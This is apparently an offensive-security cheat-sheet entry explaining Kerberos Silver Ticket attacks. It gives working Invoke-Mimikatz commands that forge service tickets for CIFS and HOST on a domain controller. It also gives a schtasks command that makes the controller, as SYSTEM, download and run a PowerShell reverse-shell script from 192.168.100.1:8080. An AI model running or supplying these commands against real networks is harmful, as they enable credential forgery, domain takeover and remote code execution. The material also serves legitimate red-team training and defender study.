A silver Ticket attack is similar to a Golden Ticket in that it involves abusing credentials.
A silver Ticket allows an attacker to forge a valid TGS for specific services. 

The password hash for the service account must be known, as the TGS is encrypted using the Service Accounts password hash.

Invoke-Mimikatz is used here again.


```powershell
#Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
Invoke-Mimikatz-Command '"kerberos::golden /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dc.abc.example.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator/ptt"' 
#Similar commands can be used for any other service on a machine. HOST, RPCSS, WSMAN etc. 


#There are various ways of achieving command execution using Silver tickets. 
#Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
Invoke-Mimikatz-Command '"kerberos::golden /domain:abc.example.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dc.abc.example.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator/ptt"'


#Schedule and execute a task.
schtasks /create /S dc.abc.example.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex(New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
schtasks/Run/S dc.abc.example.local /TN "STCheck"
```


Breakdown of Invoke-Mimikatz command:
```sh
Kerberos:golden - Name of the module used
/user - The user account which the TGT will be generated for
/domain - domain FQDN
/sid - SID of the domain
/krbtgt - NTLM hash of the krbtgt account, /aes128 and /aes256 can be used also
/id,/groups - User ID and Group ID
/ptt - Injects the ticket into the current PowerShell process
/service - the SPN name of the service for which the TGS will be created for

/startoffset -  These last 3 options are optional inputs that can be used to match the current domain configuration for tickets
/endin
/renewmax
```